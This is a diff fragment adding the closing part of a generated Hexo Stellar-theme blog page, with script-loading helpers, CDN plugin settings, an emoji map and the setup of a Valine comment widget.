+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
